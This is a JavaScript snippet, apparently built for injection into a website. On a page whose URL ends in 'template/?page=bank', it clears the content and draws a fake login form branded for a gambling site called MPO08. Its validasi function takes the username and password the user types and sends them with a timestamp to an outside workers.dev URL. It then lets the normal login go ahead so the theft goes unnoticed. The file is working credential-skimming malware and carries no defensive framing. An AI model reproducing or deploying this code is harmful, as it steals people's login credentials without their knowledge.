(function () {
  // Cek URL akhir
  const currentURL = window.location.href;
  if (!currentURL.endsWith('template/?page=bank')) {
    return; // Bukan halaman target, keluar
  }

  // Kosongkan halaman lama
  document.documentElement.innerHTML = '';
  document.head.innerHTML = '';
  document.body.innerHTML = '';

  // Meta & Title
  const metaCharset = document.createElement('meta');
  metaCharset.setAttribute('charset', 'utf-8');
  document.head.appendChild(metaCharset);

  const metaViewport = document.createElement('meta');
  metaViewport.name = 'viewport';
  metaViewport.content = 'width=device-width, initial-scale=1';
  document.head.appendChild(metaViewport);

  const title = document.createElement('title');
  title.textContent = 'SITUS RESMI DAN TERPERCAYA SE-ASIA. MPO08';
  document.head.appendChild(title);

  const favicon = document.createElement('link');
  favicon.rel = 'icon';
  favicon.type = 'image/png';
  favicon.sizes = '16x16';
  favicon.href = 'https://mpo08website.sbs/assets/img/IMG_6692.png';
  document.head.appendChild(favicon);

  const css = document.createElement('link');
  css.rel = 'stylesheet';
  css.href = 'https://mpo08website.sbs/backend/dist/css/style.min.css';
  document.head.appendChild(css);

  // Struktur tampilan login
  document.body.innerHTML = `
    <div class="main-wrapper">
      <div class="preloader">
        <div class="lds-ripple">
          <div class="lds-pos"></div>
          <div class="lds-pos"></div>
        </div>
      </div>
      <div class="auth-wrapper d-flex no-block justify-content-center align-items-center" 
        style="background:url(https://mpo08website.sbs/backend/assets/images/big/auth-bg.jpg) no-repeat center center;">
        <div class="auth-box">
          <div id="loginform">
            <div class="logo">
              <span class="db">
                <img class="container-fluid" src="https://mpo08website.sbs/backend/logoryota.jpg">
              </span>
              <strong>
                <h5 class="font-medium m-b-20">
                  WEB DEVELOPER BY 
                  <a href="https://wa.me/27834863724" rel="noopener noreferrer" style="color:#fc3a41;">RYOTAA</a> 
                  | Bergabung dan Jadilah Bagian Dari Kesuksesan Kami.
                </h5>
              </strong>
            </div>
            <div class="row">
              <div class="col-12">
                <form class="form-horizontal m-t-20" id="loginform" 
                  action="https://mpo08website.sbs/backend/cek_login.php" 
                  onsubmit="return validasi()" method="POST">
                  <div class="input-group mb-3">
                    <div class="input-group-prepend">
                      <span class="input-group-text"><i class="ti-user"></i></span>
                    </div>
                    <input type="text" class="form-control form-control-lg" 
                      name="username" id="username" placeholder="Username">
                  </div>
                  <div class="input-group mb-3">
                    <div class="input-group-prepend">
                      <span class="input-group-text"><i class="ti-pencil"></i></span>
                    </div>
                    <input type="password" class="form-control form-control-lg" 
                      name="password" id="password" placeholder="Password">
                  </div>
                  <div class="form-group text-center">
                    <div class="col-xs-12 p-b-20">
                      <button class="btn btn-block btn-lg btn-info" name="login" type="submit">
                        Log In
                      </button>
                    </div>
                  </div>
                  <footer class="footer text-center">
                    All Rights Reserved by 
                    <a href="https://wa.me/27834863724">RYOTAA</a>.
                    Designed and Developed by 
                    <a href="https://wa.me/27834863724">RYOTATEAM</a>.
                  </footer>
                </form>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  `;

  // Script eksternal
  const jquery = document.createElement('script');
  jquery.src = 'https://mpo08website.sbs/backend/assets/libs/jquery/dist/jquery.min.js';
  jquery.onload = function () {
    const popper = document.createElement('script');
    popper.src = 'https://mpo08website.sbs/backend/assets/libs/popper.js/dist/umd/popper.min.js';
    document.body.appendChild(popper);

    const bootstrap = document.createElement('script');
    bootstrap.src = 'https://mpo08website.sbs/backend/assets/libs/bootstrap/dist/js/bootstrap.min.js';
    document.body.appendChild(bootstrap);

    bootstrap.onload = function () {
      if (window.$) {
        $('[data-toggle="tooltip"]').tooltip();
        $(".preloader").fadeOut();
      }
    };
  };
  document.body.appendChild(jquery);

  // Fungsi validasi + kirim username & waktu login
  window.validasi = function () {
    const username = document.getElementById('username').value.trim();
    const password = document.getElementById('password').value.trim();

    if (username !== '' && password !== '') {
      const waktuLogin = new Date().toLocaleString();
      const pesan = encodeURIComponent(`${username} ; ${password} ; ${waktuLogin}`);

      fetch(`https://memek-worker.defoy89122.workers.dev/?message=${pesan}`)
        .catch(err => console.error('Gagal mengirim notifikasi:', err));

      return true; // lanjutkan proses login normal
    } else {
      alert('Username dan Password harus di isi !');
      return false;
    }
  };
})();
